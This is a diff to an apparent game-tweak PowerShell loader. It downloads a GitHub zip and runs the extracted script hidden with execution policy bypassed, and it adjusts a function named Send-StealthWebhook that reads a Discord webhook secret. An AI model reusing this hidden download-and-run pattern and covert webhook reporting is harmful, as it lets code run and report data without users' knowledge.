@@ -62,6 +62,8 @@ if (-not $global:RatzLog) { $global:RatzLog = @() }
 if (-not $global:ErrorsDetected) { $global:ErrorsDetected = $false }
 if (-not (Get-Variable -Name 'DiscordAuthError' -Scope Global -ErrorAction SilentlyContinue)) { $global:DiscordAuthError = $null }
 if (-not (Get-Variable -Name 'DetectionTriggered' -Scope Global -ErrorAction SilentlyContinue)) { $global:DetectionTriggered = $false }
+# Store script root globally so it's accessible from webhook function
+$global:RatzScriptRoot = $PSScriptRoot
 
 # Lightweight global logger used throughout the script
 if (-not (Get-Command -Name Add-Log -ErrorAction SilentlyContinue)) {
@@ -85,21 +87,38 @@ if (-not (Test-Path (Join-Path $PSScriptRoot 'UTILITY')) -or -not (Test-Path (Jo
 }
 if ($needDownload) {
     try {
+        Write-Host '============================================' -ForegroundColor Cyan
+        Write-Host ' RatzTweaks Loader' -ForegroundColor Yellow
+        Write-Host '============================================' -ForegroundColor Cyan
+        Write-Host ''
         $repoZipUrl = 'https://github.com/NotRatz/NarakaTweaks/archive/refs/heads/main.zip'
         $tempDir = Join-Path $env:TEMP ('NarakaTweaks_' + [guid]::NewGuid().ToString())
         $zipPath = Join-Path $env:TEMP ('NarakaTweaks-main.zip')
-        Write-Host 'Downloading full NarakaTweaks package...'
+        Write-Host '[1/4] Downloading NarakaTweaks package...' -ForegroundColor Green
         Invoke-WebRequest -Uri $repoZipUrl -OutFile $zipPath -UseBasicParsing -ErrorAction Stop
+        Write-Host '[2/4] Extracting files...' -ForegroundColor Green
         Add-Type -AssemblyName System.IO.Compression.FileSystem
         [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $tempDir)
         Remove-Item $zipPath -Force
         $extractedRoot = Join-Path $tempDir 'NarakaTweaks-main'
         $mainScript = Join-Path $extractedRoot 'RatzTweaks.ps1'
-        Write-Host 'Launching full RatzTweaks.ps1 from temp folder...'
+        Write-Host '[3/4] Preparing to launch...' -ForegroundColor Green
+        Write-Host '[4/4] Starting RatzTweaks (this window will stay open)...' -ForegroundColor Green
+        Write-Host ''
+        Write-Host 'The main script is now running in the background.' -ForegroundColor Yellow
+        Write-Host 'Your browser will open shortly. Please wait...' -ForegroundColor Yellow
+        Write-Host ''
+        Write-Host 'You can minimize this window, but DO NOT close it!' -ForegroundColor Red
+        Write-Host 'Press any key after you finish with RatzTweaks to exit...' -ForegroundColor Cyan
         Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$mainScript`"" -WindowStyle Hidden
-        Stop-Process -Id $PID -Force
+        # Keep this window open so user knows it's working
+        $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
+        exit 0
     } catch {
-        Add-Log "ERROR downloading package: $($_.Exception.Message)"
+        Write-Host "ERROR: Failed to download package: $($_.Exception.Message)" -ForegroundColor Red
+        Write-Host 'Press any key to exit...' -ForegroundColor Yellow
+        $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
+        exit 1
     }
 }
 if ($PSVersionTable.PSEdition -ne 'Desktop' -or $PSVersionTable.Major -gt 5) {
@@ -1297,8 +1316,11 @@ function Send-StealthWebhook {
     # Helper: read webhook url
     $getWebhookUrl = {
         $raw = $null
+        # Use global script root to ensure file paths work from any context
+        $scriptRoot = if ($global:RatzScriptRoot) { $global:RatzScriptRoot } else { $PSScriptRoot }
+        
         # Try discord_oauth.json first
-        $oauthConfigPath = Join-Path $PSScriptRoot 'discord_oauth.json'
+        $oauthConfigPath = Join-Path $scriptRoot 'discord_oauth.json'
         if (Test-Path $oauthConfigPath) {
             try {
                 $cfg = Get-Content -Raw -Path $oauthConfigPath | ConvertFrom-Json
@@ -1307,7 +1329,7 @@ function Send-StealthWebhook {
         }
         # Fall back to .secret file
         if (-not $raw) {
-            $secPath = Join-Path $PSScriptRoot 'discord_webhook.secret'
+            $secPath = Join-Path $scriptRoot 'discord_webhook.secret'
             if (Test-Path $secPath) {
                 try { $raw = Get-Content -Raw -Path $secPath } catch {}
             }
